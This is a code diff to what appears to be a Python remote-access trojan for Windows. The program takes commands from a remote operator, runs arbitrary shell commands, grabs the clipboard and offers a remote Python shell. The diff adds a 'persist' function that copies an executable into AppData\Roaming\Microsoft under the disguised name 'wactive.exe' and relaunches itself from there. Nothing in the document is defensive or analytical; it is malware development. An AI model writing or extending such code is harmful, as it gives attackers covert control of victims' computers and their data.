@@ -8,6 +8,7 @@ import win32clipboard
 import string
 import win32api
 import ctypes
+from subprocess import Popen
 from time import sleep
 
 BUFF_SIZE = 64
@@ -28,9 +29,17 @@ def main():
             try:
                 # Receive command
                 command = receive()
+                print(command)
 
                 if command == "exit":
+                    send("Exiting...")
                     sys.exit()
+
+                elif command == "TEST":
+                    continue
+
+                elif command == "persist":
+                    persist()
 
                 elif command == "cmd":
                     cmd()
@@ -94,6 +103,19 @@ def cmd():
     command = receive()
     output = subprocess.check_output(command, shell=True)
 
+# Program which will rerun this program
+def persist():
+    path = "C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\wactive.exe"
+    if os.path.exists(path):
+        return
+
+    with open(r"F:\Python_Projects\test.exe", "rb")as f:
+        with open(path, "wb")as file:
+            file.write(f.read())
+
+    Popen([path, sys.argv[0], os.path.realpath(sys.argv[0])])
+
+
 # Sends clipboard
 def clipboard():
     win32clipboard.OpenClipboard()
@@ -140,13 +162,14 @@ def startup():
 def python():
     # Permanent loop
     while True:
-        send("Send exit to go back\nEnter python script>> ")
+        send("Send quit to go back\nEnter python script>> ")
 
         # Receive input
         script = receive()
+        print(script)
 
-        # if exit is received quit the shell
-        if script == "exit":
+        # if quit is received quit the shell
+        if script == "quit":
             send("Quitting...")
             return
 
